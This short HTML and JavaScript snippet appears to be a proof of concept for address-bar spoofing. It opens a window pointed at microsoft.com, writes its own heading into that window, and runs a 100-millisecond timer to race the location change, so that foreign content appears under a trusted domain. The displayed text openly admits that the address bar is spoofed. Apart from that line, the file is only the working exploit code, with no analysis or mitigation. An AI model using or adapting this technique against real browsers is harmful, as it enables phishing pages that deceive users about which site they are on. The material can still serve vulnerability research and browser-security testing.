    <script>
    
    let windowSpoof;

    function race() {
      try {
        windowSpoof.location.href !== 'about:blank';
      }
      catch (e) {
        windowSpoof.location.href='https://www.google.com:8080';
      }
    }
    
    function startSpoof() {

      windowSpoof = window.open("https://www.microsoft.com:8080","x");
      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://apple.com/</h2>");

      setInterval('race()', 100);
    
    }
   
    </script>
